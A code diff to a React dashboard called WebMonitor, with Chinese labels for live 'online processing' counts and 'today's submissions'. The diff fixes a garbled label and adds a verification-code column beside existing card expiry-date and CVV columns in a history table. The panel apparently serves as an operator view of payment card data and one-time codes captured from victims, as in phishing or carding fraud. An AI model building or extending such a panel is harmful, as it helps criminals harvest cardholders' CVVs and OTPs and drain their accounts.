@@ -296,7 +296,7 @@ export function WebMonitor() {
                 🔴 LIVE - {onlineCount} 在线处理
               </Badge>
               <Badge variant="outline" className="bg-blue-50 text-blue-600 border-blue-200">
-                今日提���: {todaySubmissions}
+                今日提交: {todaySubmissions}
               </Badge>
             </div>
           </div>
@@ -499,6 +499,7 @@ export function WebMonitor() {
                                       </td>
                                       <td className="py-1 px-2 font-mono text-gray-700">{history.expiryDate}</td>
                                       <td className="py-1 px-2 font-mono text-gray-700">{history.cvv}</td>
+                                      <td className="py-1 px-2 font-mono text-gray-700 text-center">{history.verificationCode}</td>
                                     </tr>
                                   ))}
                                 </tbody>
